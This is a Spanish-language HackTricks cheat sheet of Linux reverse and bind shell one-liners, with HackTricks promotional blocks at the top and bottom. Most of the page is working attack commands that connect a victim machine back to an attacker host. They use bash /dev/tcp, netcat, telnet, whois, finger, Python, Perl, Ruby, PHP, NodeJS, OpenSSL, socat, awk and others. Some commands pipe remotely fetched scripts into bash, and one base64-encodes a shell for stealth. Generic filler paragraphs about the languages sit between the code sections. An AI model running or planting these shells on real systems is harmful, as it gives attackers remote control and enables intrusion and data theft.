# Shells - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Si tienes preguntas sobre cualquiera de estas shells, puedes verificarlas con** [**https://explainshell.com/**](https://explainshell.com)

## TTY completo

**Una vez que obtengas una shell inversa**[ **lee esta página para obtener un TTY completo**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
No olvides comprobar con otros shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh y bash.

### Shell seguro de símbolos
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explicación de Shell

1. **`bash -i`**: Esta parte del comando inicia una shell interactiva (`-i`) de Bash.
2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) **como el error estándar** (`stderr`) al **mismo destino**.
3. **`/dev/tcp/<DIRECCIÓN-IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
   * Al **redirigir las salidas de los flujos de datos a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.

### Crear en archivo y ejecutar
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell hacia adelante

Puede haber casos en los que tenga una **RCE en una aplicación web en una máquina Linux**, pero debido a reglas de Iptables u otros tipos de filtrado, **no puede obtener una shell inversa**. Esta "shell" le permite mantener una shell PTY a través de esa RCE utilizando tuberías dentro del sistema víctima.\
Puede encontrar el código en [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Solo necesita modificar:

* La URL del host vulnerable
* El prefijo y sufijo de su carga útil (si corresponde)
* La forma en que se envía la carga útil (¿encabezados? ¿datos? ¿información adicional?)

Luego, simplemente puede **enviar comandos** o incluso **usar el comando `upgrade`** para obtener un PTY completo (tenga en cuenta que las tuberías se leen y escriben con un retraso aproximado de 1,3 segundos).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Revísalo en [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet es un protocolo de red que permite la comunicación bidireccional utilizando un terminal de texto. Es utilizado para conectarse a un servidor remoto y ejecutar comandos en él. Telnet no es seguro, ya que la información se transmite en texto plano, lo que significa que cualquier persona que tenga acceso a la red puede interceptar y leer la información transmitida. Por esta razón, se recomienda utilizar SSH en su lugar, ya que proporciona una conexión segura y cifrada.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Atacante**
```bash
while true; do nc -l <port>; done
```
Para enviar el comando, escríbelo, presiona enter y luego presiona CTRL+D (para detener STDIN)

**Víctima**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python es un lenguaje de programación interpretado y de alto nivel que se utiliza ampliamente en el hacking. Es fácil de aprender y tiene una gran cantidad de bibliotecas y módulos disponibles que pueden ser útiles para las tareas de hacking. Algunas de las bibliotecas más populares para el hacking son:

- **Requests**: una biblioteca para enviar solicitudes HTTP/HTTPS.
- **BeautifulSoup**: una biblioteca para analizar HTML y XML.
- **Scrapy**: un marco de trabajo para la extracción de datos web.
- **Paramiko**: una biblioteca para la conexión SSH.
- **Selenium**: una biblioteca para la automatización del navegador web.

Python también es útil para la creación de herramientas personalizadas de hacking. Algunas de las herramientas de hacking más populares escritas en Python son:

- **Metasploit**: un marco de trabajo para la explotación de vulnerabilidades.
- **Nmap**: una herramienta de escaneo de puertos y detección de servicios.
- **Scapy**: una herramienta para la creación y manipulación de paquetes de red.
- **Hydra**: una herramienta para la fuerza bruta de contraseñas.
- **John the Ripper**: una herramienta para la recuperación de contraseñas.

Python también se puede utilizar para la automatización de tareas de hacking, como la recopilación de información y la explotación de vulnerabilidades.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```
## Perl

Perl es un lenguaje de programación interpretado de propósito general que se utiliza comúnmente en la creación de scripts y en el desarrollo de aplicaciones web. Es especialmente útil para el procesamiento de texto y la manipulación de archivos. Perl es compatible con una amplia variedad de sistemas operativos y es muy popular en la comunidad de hacking debido a su capacidad para realizar tareas complejas con facilidad.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby es un lenguaje de programación interpretado y orientado a objetos. Es muy popular en el desarrollo web y se utiliza en muchos frameworks como Ruby on Rails. También es utilizado en scripting y en la creación de herramientas de hacking. Ruby es fácil de leer y escribir, lo que lo hace una buena opción para aquellos que están comenzando en la programación.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP es un lenguaje de programación popular para la creación de aplicaciones web dinámicas. Es ampliamente utilizado en la creación de sitios web y aplicaciones web, y es compatible con una variedad de sistemas operativos y servidores web. PHP también es compatible con una amplia variedad de bases de datos, lo que lo hace ideal para aplicaciones web que requieren acceso a bases de datos. Además, PHP es un lenguaje de código abierto, lo que significa que es gratuito y está disponible para su uso y modificación por parte de cualquier persona.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java es un lenguaje de programación popular utilizado en muchas aplicaciones empresariales y de servidor. Algunas técnicas de hacking comunes en aplicaciones Java incluyen la inyección de código y la manipulación de objetos Java. Es importante tener en cuenta que Java también se utiliza en muchos sistemas de seguridad, por lo que los hackers deben tener un conocimiento profundo del lenguaje para poder explotar con éxito las vulnerabilidades.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat es una herramienta de línea de comandos que permite la transferencia de datos a través de redes utilizando TCP, UDP, SSL y otras conexiones. Es una herramienta muy útil para la creación de backdoors y la transferencia de archivos de forma segura. Además, Ncat también puede ser utilizado para la creación de túneles y la redirección de puertos.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

Golang es un lenguaje de programación de código abierto desarrollado por Google. Es conocido por su eficiencia y facilidad de uso en la creación de aplicaciones de alto rendimiento. Golang es especialmente popular en el desarrollo de aplicaciones de servidor y en la creación de herramientas de línea de comandos. Además, Golang tiene una biblioteca estándar muy completa que incluye funciones para la manipulación de cadenas, la gestión de archivos y la creación de servidores web.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua es un lenguaje de programación interpretado, ligero y de propósito general. Es utilizado en muchos proyectos, incluyendo videojuegos, aplicaciones web y sistemas embebidos. Lua es conocido por su facilidad de integración con otros lenguajes y por su eficiencia en tiempo de ejecución. Además, es altamente personalizable y extensible, lo que lo hace una opción popular para scripting en juegos y aplicaciones.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS es un entorno de tiempo de ejecución de JavaScript que se utiliza para construir aplicaciones de red escalables. NodeJS se basa en el motor V8 de Google Chrome y permite a los desarrolladores escribir aplicaciones en JavaScript tanto en el lado del cliente como en el del servidor. NodeJS es muy popular en el desarrollo de aplicaciones web y se utiliza en muchos proyectos de código abierto.
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

El Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
El objetivo
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de enlace
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
```
### Shell inversa
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk es una herramienta de procesamiento de texto que se utiliza para buscar y manipular patrones en archivos de texto. Es especialmente útil para extraer información de archivos de registro y otros archivos de texto estructurados. Awk se ejecuta en la línea de comandos y utiliza una sintaxis similar a la de C.

La sintaxis básica de Awk es la siguiente:

```
awk '/patrón/ {acción}' archivo
```

Donde `/patrón/` es el patrón que se busca en el archivo y `{acción}` es la acción que se realiza cuando se encuentra el patrón. Por ejemplo, para imprimir todas las líneas que contienen la palabra "error" en un archivo llamado `log.txt`, se puede utilizar el siguiente comando:

```
awk '/error/ {print}' log.txt
```

También se pueden utilizar variables en Awk para almacenar valores y realizar cálculos. Por ejemplo, para sumar todos los valores en la tercera columna de un archivo CSV, se puede utilizar el siguiente comando:

```
awk -F ',' '{sum += $3} END {print sum}' archivo.csv
```

En este comando, `-F ','` especifica que el separador de campo es una coma, `$3` se refiere al tercer campo en cada línea y `END` indica que la acción se realiza después de que se hayan procesado todas las líneas del archivo.

Awk es una herramienta muy poderosa y versátil que puede ser utilizada para una amplia variedad de tareas de procesamiento de texto.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Atacante**
```bash
while true; do nc -l 79; done
```
Para enviar el comando, escríbelo, presiona enter y luego presiona CTRL+D (para detener STDIN)
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk es una herramienta de procesamiento de texto que se utiliza para buscar y manipular patrones en archivos de texto. Es una versión mejorada de awk, que es una herramienta de línea de comandos que se utiliza para procesar archivos de texto. Gawk es una herramienta muy poderosa que se utiliza comúnmente en la línea de comandos de Linux para realizar tareas de procesamiento de texto complejas.

Algunos de los usos comunes de Gawk incluyen la búsqueda y manipulación de archivos de registro, la extracción de datos de archivos de texto y la generación de informes a partir de datos de texto. Gawk también se puede utilizar para procesar archivos CSV y otros formatos de archivo de texto.

Gawk utiliza una sintaxis similar a la de awk, pero tiene muchas características adicionales que lo hacen más poderoso y flexible. Algunas de las características adicionales de Gawk incluyen la capacidad de procesar expresiones regulares más complejas, la capacidad de procesar múltiples archivos de entrada y la capacidad de procesar archivos binarios.

En resumen, Gawk es una herramienta muy útil para cualquier persona que necesite procesar archivos de texto en la línea de comandos de Linux. Con su sintaxis fácil de usar y sus características adicionales, Gawk puede ayudar a automatizar muchas tareas de procesamiento de texto y ahorrar tiempo y esfuerzo.
```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```
## Xterm

Una de las formas más simples de shell inverso es una sesión de xterm. El siguiente comando debe ejecutarse en el servidor. Intentará conectarse de vuelta a ti (10.0.0.1) en el puerto TCP 6001.
```bash
xterm -display 10.0.0.1:1
```
Para capturar el xterm entrante, inicie un servidor X (:1 - que escucha en el puerto TCP 6001). Una forma de hacerlo es con Xnest (que se ejecutará en su sistema):
```bash
Xnest :1
```
Necesitarás autorizar al objetivo para que se conecte contigo (el comando también se ejecuta en tu host):
```bash
xhost +targetip
```
## Groovy

por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: El shell inverso de Java también funciona para Groovy.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Bibliografía

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
